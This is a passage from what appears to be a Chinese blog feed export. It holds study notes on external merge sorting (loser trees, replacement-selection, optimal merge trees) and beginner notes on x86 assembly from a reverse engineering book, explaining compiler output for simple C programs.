class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9011879999999999em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></p><ul><li>由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mrow><mi>I</mi><mi>O</mi></mrow></msub></mrow><annotation encoding="application/x-tex">t_{IO}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>很耗时，提高外排的效率主要应着眼于减少外存信息读取的次数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span></li></ul></li><li><p>优化:</p><ul><li><p><strong>多路归并</strong></p><ul><li><p>一般情况下对于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>个初始归并段，进行k-路平衡归并</p><p>归并的趟数为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>=</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>k</mi></msub><mi>m</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">s=\lceil log_k{m}\rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">m</span></span><span class="mclose">⌉</span></span></span></span></p><p>可以看到增大k可以减少s，进而减少d，从而提高效率</p></li></ul></li><li><p>利用<strong>败者树</strong>实现k-路归并</p><p>单纯增加k会导致<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><msub><mi>t</mi><mrow><mi>m</mi><mi>g</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ut_{mg}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9011879999999999em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>增加，原因如下</p><p>对k-路归并而言，令u个记录分布在k个归并段，每得到一个关键字最小的记录需要k-1次比较，因此为得到含u个记录的归并段需要(u-1)(k-1)次比较,由于进行了s趟归并，总的比较次数就是s(u-1)(k-1)</p><p>对n个记录而言</p><p>内部归并所需的时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>k</mi></msub><mi>m</mi><mo stretchy="false">⌉</mo><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><msub><mi>t</mi><mrow><mi>m</mi><mi>g</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\lceil log_k{m}\rceil(k-1)(n-1)t_{mg}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">m</span></span><span class="mclose">⌉</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>,k增大会导致比较次数增大，进而导致内部归并排序时间增大</p><p><mark>如果我们在归并比较阶段使用败者树</mark>，那么比较次数仅需<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>k</mi></mrow><annotation encoding="application/x-tex">log_2{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span>，从而使内部归并所需时间消掉k的影响，进而提高效率,这里并非完全消除k的影响，k的选择并非越大越好</p></li><li><p>置换-选择排序</p><p><mark>这是是从减少m的角度来提高外排效率</mark></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mo stretchy="false">⌈</mo><mfrac><mi>n</mi><mi>l</mi></mfrac><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">m=\lceil \frac{n}{l} \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mopen">⌈</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌉</span></span></span></span>,若要减少m，就要增大l，，先前的内部排序方法受到工作区内存大小的限制，即l的大小不能超出工作区内存，而如果采用置换选择排序，就可以突破工作区的限制</p><p>置换-选择排序具体过程课本P300</p></li><li><p>利用败者树实现置换选择排序</p><p>具体构建:P303</p><p>败者树可以提高置换选择排序的效率</p></li><li><p>最佳归并树</p><p><mark>使用了置换选择排序，每个段长度不等，磁盘IO次数也不等</mark></p><p>将磁盘IO次数视作归并树的权值，</p><p>那么构建归并树时，构建为哈夫曼树，就可以使磁盘IO次数最小，称之为最佳归并树</p><p>由于最佳归并树是完全k叉树，当段的数量不满足条件时，我们可以添加长度为0的虚段使之进行构建哈夫曼树</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>k</mi></msub><mo>+</mo><msub><mi>n</mi><mn>0</mn></msub><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">n_k+n_0=n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn><mo>=</mo><mi>k</mi><msub><mi>n</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">n-1=kn_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>联立得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>k</mi></msub><mo>=</mo><mfrac><mrow><msub><mi>n</mi><mn>0</mn></msub><mo>−</mo><mn>1</mn></mrow><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">n_k=\frac{n_0-1}{k-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2645389999999999em;vertical-align:-0.403331em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8612079999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.403331em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>能构建则nk为整数也就是说若<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>−</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mspace width="1em"/><mi>k</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">m-1\quad mod \quad k-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>为0就不需要添加，不为0，就添加虚段直到为0</p></li><li><p>模拟实现</p><p><a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms/blob/master/C/Sort/outSort.cpp">DataStructuresAndAlgorithms/C/Sort/outSort.cpp at master · OneLastChick/DataStructuresAndAlgorithms (github.com)</a></p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>re4b阅读笔记</title>
      <link href="/2024/05/23/re4b%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/05/23/re4b%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="part1-前言"><a class="markdownIt-Anchor" href="#part1-前言"></a> Part.1 前言</h1><p>阅读这种书籍，如果我不做笔记，我可能就会走马观花的粗略看一遍，结果什么都没学会，眼睛会了，脑子不会，所以我准备边做笔记边学，争取把基础打扎实</p><p>对于逆向工程权威指南关键部分的摘录,整理以及个人的理解</p><p>逆向工程权威指南是入门逆向必读的一本书籍</p><p>由于我是初学者，所以我目前只学习re4b x86汇编部分（不能贪多），对于ARM以及MIPS架构待以后进阶后再进行学习</p><h1 id="part2-指令讲解"><a class="markdownIt-Anchor" href="#part2-指令讲解"></a> Part.2 指令讲解</h1><h2 id="chapter1-cpu"><a class="markdownIt-Anchor" href="#chapter1-cpu"></a> Chapter1 CPU</h2><p>**指令码：**CPU受理的底层命令。典型的底层命令有：将数据在寄存器间转移、操作内存、计算运算等指令。每类CPU都有自己的指令集架构（Instruction Set Architecture，ISA）。</p><p>**机器码：**发送给CPU的程序代码。一条指令通常被封装为若干字节。</p><p>**汇编语言：**为了让程序员少长白头发而创造出来的、易读易记的代码，它有很多类似宏的扩展功能。</p><p>**CPU寄存器：**每种CPU都有其固定的通用寄存器（GPR）。x86 CPU里一般有8个GPR，x64里往往有16个GPR，而ARM里则通常有16个GPR。您可以认为CPU寄存器是一种存储单元，它能够无差别地存储所有类型的临时变量。假如您使用一种高级的编程语言，且仅会使用到8个32位变量，那么光CPU自带的寄存器就能完成不少任务了！</p><p><strong>指令集架构</strong></p><p>最常见的三种</p><ul><li><p>ARM指令集分为3类：ARM模式指令集、Thumb模式指令集（包括Thumb-2）和ARM64的指令集。需要强调的是：不同的指令集分别</p><p>属于不同的指令集架构；一个指令集绝非另一个指令集的变种。</p></li><li><p>x86指令集 各opcode（汇编指令对应的机器码）的长度不尽相同</p></li><li><p>MIPS指令集 多数都使用了固定长度的32位opcode</p></li></ul><p><strong>汇编语言</strong>存在两种主流语体，即<strong>Intel语体</strong>和<strong>AT&amp;T语体</strong></p><h2 id="chap2-最简函数"><a class="markdownIt-Anchor" href="#chap2-最简函数"></a> Chap2 最简函数</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">f:mov eax,123ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个函数仅由两条指令构成：第一条指令把数值123存放在EAX寄存器里；根据函数调用约定,后面一条指令会把EAX的值当作返回值传递给调用者函数，而调用者函数（caller）会从EAX寄存器里取值，把它当作返回结果。</p><h2 id="chap3-helloworld"><a class="markdownIt-Anchor" href="#chap3-helloworld"></a> Chap3 Hello,World!</h2><h3 id="msvs"><a class="markdownIt-Anchor" href="#msvs"></a> msvs</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello,world!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用MSVS<code>cl 1.cpp /Fa1.asm</code>生成<code>1.asm</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">CONST   SEGMENT$SG3830 DB       &#39;hello, world&#39;, 0AH, 00HCONST   ENDSPUBLIC  _mainEXTRN   _printf:PROC; Function compile flags: &#x2F;Odtp_TEXT   SEGMENT_main   PROC        push    ebp        mov     ebp, esp        push    OFFSET $SG3830        call    _printf        add     esp, 4        xor     eax, eax        pop     ebp        ret     0_main   ENDP_TEXT   ENDS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成<code>1.asm</code>后，编译器会生成<code>1.obj</code>然后再链接为<code>1.exe</code></p><p>对这段汇编的解读</p><ul><li><p>文件分为两个代码段，即CONST和_TEXT段，它们分别代表数据段和代码段。</p></li><li><p>字符串常量“hello，world”分配了一个指针（const char[]），只是在代码中这个指针的名称并不明显</p></li><li><p>编译器进行了自己的处理，并在内部把字符串常量命名为$SG3830,<code>0AH</code>是换行符</p><p>可以发现在字符串常量尾部添加了<code>00H</code>这个是字符串常量的结束标志,编译器添加的</p></li><li><p>在代码段<code>_TEXT</code>只有一个函数，即<code>main()</code>,其中<code>PROC</code>是<code>Procdure</code>的缩写，表示程序的开始,与<code>ENDP</code>配对使用</p></li><li><p>主函数的函数体有标志性的函数序言（function prologue）</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push ebp        ; 保存调用者的栈帧指针mov ebp, esp    ; 建立当前函数的栈帧指针sub esp, N      ; 为局部变量分配空间（N 是需要分配的字节数）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以及函数尾声（function epilogue）</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov esp, ebp    ; 恢复栈指针pop ebp         ; 恢复调用者的栈帧指针ret             ; 返回到调用者<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>实际上所有的函数都有这样的序言和尾声。</p></li><li><p>在函数序言之后，看到调用<code>printf()</code>的指令<code>CALL _printf</code></p><p>通过<code>PUSH</code>指令，程序把字符串的指针推送入栈。这样，<code>printf()</code>函数就可以调用栈里的指针，即字符串<code>“hello, world!”</code>的地址。</p></li><li><p>在<code>printf()</code>函数结束以后，程序的控制流会返回到<code>main()</code>函数之中。此时，字符串地址（即指针）仍残留在数据栈之中。这个时候就需要调整栈指针（ESP寄存器里的值）来释放这个指针。</p></li><li><p>下一条语句是<code>“add ESP，4”</code>，把ESP寄存器（栈指针/Stack Pointer）里的数值加4。(在32位系统中，指针的大小占4字节，同理在64位中，就要+8)</p><p>这条指令可以理解为“POP某寄存器”。只是本例的指令直接舍弃了栈里的数据而POP指令还要把寄存器里的值存储到既定寄存器</p><p>某些编译器（如Intel C<ins>编辑器）不会使用ADD指令来释放数据栈，<strong>它们可能会用POP ECX指令</strong>。例如，Oracle RDBMS（由Intel C</ins>编译器编译）就会用POP ECX指令，而不会用ADD指令。虽然POP ECX命令确实会修改ECX寄存器的值，但是它也同样释放了栈空间。</p><p>Intel C++编译器使用POP ECX指令的另外一个理由就是，<strong>POP ECX对应的OPCODE（1字节）比ADD ESP的OPCODE（3字节）要短。</strong></p></li><li><p>在上述程序中printf()函数结束之后，main()函数会返回0（函数正常退出的返回码）。即main()函数的运算结果是0。这个返回值是由<strong>指令<code>“XOR EAX, EAX”</code>计算出来的</strong>。编译器通常采用异或运算指令，而不会使用“MOV EAX，0”指令。主要是因为<strong>异或运算的opcode较短</strong>（2字节:5字节）</p></li><li><p>汇编列表中最后的操作指令是RET，将控制权交给调用程序。通常它起到的作用就是将控制权交给操作系统，这部分功能由C/C++的<code>CRT</code>实现。（C RUNTIME LIBRARY)</p></li></ul><h3 id="gcc"><a class="markdownIt-Anchor" href="#gcc"></a> gcc</h3><p>利用<code>gcc</code>编译器编译<code>gcc 1.c -o 1</code>采用<code>-S -masm=intel</code>生成intel语法的汇编列表文件</p><p>生成后用IDA打开</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">Main         proc nearvar_10       &#x3D; dword ptr -10h             push    ebp             mov     ebp, esp             and     esp, 0FFFFFFF0h             sub     esp, 10h             mov     eax, offset aHelloWorld ; &quot;hello, world\n&quot;             mov     [esp+10h+var_10], eax             call    _printf             mov     eax, 0             leave             retnmain         endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>汇编解读</p><ul><li>与MSVC生成的结果基本相同。它首先把“hello, world”字符串在数据段的地址（指针）存储到EAX寄存器里，然后再把它存储在数据栈里。</li><li>开头的<code>and esp,0FFFFFFF0h</code>向16字节边界对齐（成为16的整数倍），属于初始化的指令。如果地址位没有对齐，那么CPU可能需要访问两次内存才能获得栈内数据。虽然在8字节边界处对齐就可以满足32位x86 CPU和64位x64 CPU的要求，但是主流编译器的编译规则规定“程序访问的地址必须向16字节对齐（被16整除）,目的是为了提高效率</li><li><code>“SUB ESP，10h”</code>将在栈中分配0x10 bytes，即16字节。我们在后文看到，程序只会用到4字节空间。但是因为编译器对栈地址（ESP）进行了16字节对齐，所以每次都会分配16字节的空间。</li><li>而后，程序将字符串地址（指针的值）直接写入到数据栈。此处，GCC使用的是MOV指令；而MSVC生成的是PUSH指令。其中var_10是局部变量，用来向后面的printf()函数传递参数。</li><li>GCC和MSVC不同，除非人工指定优化选项，否则它会生成与源代码直接对应的“MOV EAX, 0”指令。但是，我们已经知道MOV指令的opcode肯定要比XOR指令的opcode长。</li><li>LEAVE指令，简化函数尾声，等效于<code>“MOV ESP, EBP”</code>和“<code>POP EBP”</code>两条指令。可见，这个指令调整了数据栈指针ESP，并将EBP的数值恢复到调用这个函数之前的初始状态。</li></ul><h3 id="msvs-x86-64"><a class="markdownIt-Anchor" href="#msvs-x86-64"></a> msvs 